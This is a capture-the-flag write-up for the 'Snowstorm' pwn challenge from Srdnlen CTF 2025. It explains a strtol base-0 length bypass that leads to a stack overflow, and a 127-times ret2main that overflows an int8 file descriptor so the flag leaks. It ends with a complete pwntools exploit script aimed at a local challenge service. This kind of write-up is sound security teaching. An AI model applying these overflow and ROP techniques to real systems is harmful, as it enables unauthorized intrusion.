# Snowstorm

**CTF:** Srdnlen CTF 2025 Quals\
**Category:** pwn\
**Difficulty:** Medium\
**Author:** @church (Matteo Chiesa)

## Description

> Being an air traffic controller may not be your dream job. There are so many protocols with radio communications, radar, etc. And in case of an emergency, some parts of the message might be missing.

## Overview

This challenge is a classic ELF binary, and the idea behind it is simple: create a challenge that prints out the flag, but on `/dev/null`. Contrary to what you might think, the goal of this challenge is not to recover the flag from the black-hole file, but to test your lateral thinking when you have little room to maneuver.

## Solution

### Binary Analysis

We are dealing with a file that has _NX_ and _Partial RELRO_, but **hasn't _Stack Canaries_ and _PIE_**.\
Using a common decompiler, we can notice that, together with the initial radio message, the binary writes the flag in the `/dev/null` file. Sadly we can't recover something that is written in that special file.

The part that attracts the most attention is the `ask_length` function: after it takes the value of the length of the message, it includes many checks that involve the string with the number we give it. These seem very sketchy but are actually quite effective at limiting the digits we can send to `40`. Seems they let through numbers with the `-` sign, but there is a check for negative numbers later in the code.\
Moving forward, that string is passed to the `strtol` function with **0 as base**. There is the first vulnerability because that base tells `strtol` to recognize automatically the base from the string; more specifically, if there is a `0x` at the beginning, it will be read as base 16, else if there is just a `0` at the beginning, it will be read as base 8.\
But the digits limitations remain; therefore, **we can send `0x40` to bump up the maximum length of the message to 64, causing a stack overflow in the `main` function**.

But with that length we can't do much: we can afford to **override just one address** in the place of the return address. Basically a _ret2win_ scenario.\
But in this case, where should we jump? There isn't a win function, and we can't use a _one-gadget_ without a _libc_ leak, and a partial override isn't available. You can think of jumping directly to `sendfile` in the `print_flag` function, but the flag file has already been read.

Meanwhile, you may have noticed another oddity of this binary: right in the `print_flag` function, the variable for **the file descriptor of `/dev/null` is of _int8_ type**; just space optimization, or something else?

### The breakthrough idea

There's another technique we can afford with just one address of a ROP chain: the **_ret2main_**. But that is used only in a multi-stages exploit, to use the same vulnerability more times, like for a leak and then for the actual exploit. Here we can use it, but we're going to return to the same situation as before, it isn't provide any advancement.

Or is it?\
By doing the _ret2main_, we have overridden also the part of the stack with the two file descriptors. So when the program tries to close them, it fails, and the original file descriptors remain open. Then it executes the _ret2main_, and **opens again the same files, but with other file descriptors**.
The file descriptors of a process in Linux increase by one for each file opened by that process. And if we open enough files, we can have easily large numbers as file descriptors.

The file descriptor of _int8_ type is the key for this challenge. That is the file descriptor of where the flag is written, so if that integer is 1 or 2, the flag will be printed out on the screen, through the `stdout` or the `stderr` stream. And since that file descriptor increases by 2 at each execution of the `main` function (because it also opens `flag.txt`), **we can overflow the variable in the `print_flag` function by doing a _ret2main_ 127 times!!**. Can it be considered a challenge of 127 stages?

### Exploiting

From now on, the exploitation is business as usual. Let's chain together what we have described here:
1) we pass `0x40` as length, to send a message of 64 bytes and overflow the stack;
2) we create a ROP chain, filling the 40 bytes of the message, overriding the file descriptors and the previous base pointer with garbage, and doing a _ret2main_;
3) Repeat the first 2 steps 127 times to overflow the _int8_ variable in `print_flag` function and get the flag!

**srdnlen{39.22N_9.12E_4nd_I'll_C0n71Nu3_70_7R4n5M1t_7h15_M355463}**

Side note: The plot of this challenge is not casual. What does a pilot who doesn't know whether his emergency message has been received do, except repeat the message?

```py
import os
import pwn

def main():
    exe_path: str = f"{os.path.dirname(__file__)}/snowstorm"
    hostname: str = "localhost"
    port: int | str = "1089"
    ssl: bool = False
    gdbscript = "\n".join((
        "c",
    ))

    exe = pwn.ELF(exe_path)
    pwn.context.binary = exe
    io = connect(hostname, port, ssl, (exe.path, ), gdbscript, default_mode="local")

    # Create ROP
    rop = pwn.ROP(exe)
    rop.raw(b"a"*(40+4+4+8))    # filling until the return address
    rop.call("main")            # ret2main
    payload = rop.chain()

    for _ in range(127):
        io.sendafter(b": ", b"0x40")    # Give hexadecimal number to strtol
        io.sendafter(b"> ", payload)    # ROP

    io.recvuntil(b"\"\n")
    flag = io.recvuntil(b"}")   # Get flag
    print(flag)                 # srdnlen{39.22N_9.12E_4nd_I'll_C0n71Nu3_70_7R4n5M1t_7h15_M355463}


from typing import Literal
def connect(
        hostname: str = "", port: int | str = "", ssl: bool = False,
        argv: tuple | str = (), gdbscript: str = "",
        default_mode: Literal["remote", "local", "gdb"] = "remote"
    ) -> pwn.tube:

    if pwn.args.REMOTE:
        mode = "remote"
    elif pwn.args.GDB:
        mode = "gdb"
    elif pwn.args.LOCAL:
        mode = "local"
    else:
        mode = default_mode
        
    match mode:
        case "remote":
            assert hostname and port, "Unprovided arguments for remote execution"
            return pwn.remote(hostname, port, ssl=ssl)
        
        case "local":
            assert argv, "Unprovided arguments for local execution"
            if isinstance(argv, str):
                exe_cwd = os.path.dirname(argv)
            else:
                exe_cwd = os.path.dirname(argv[0])
            return pwn.process(argv, cwd=exe_cwd)
        
        case "gdb":
            assert argv, "Unprovided arguments for debug execution"
            return pwn.gdb.debug(argv, gdbscript)
        
        case _: raise ValueError("Unknown mode")

if __name__ == "__main__":
    main()
```
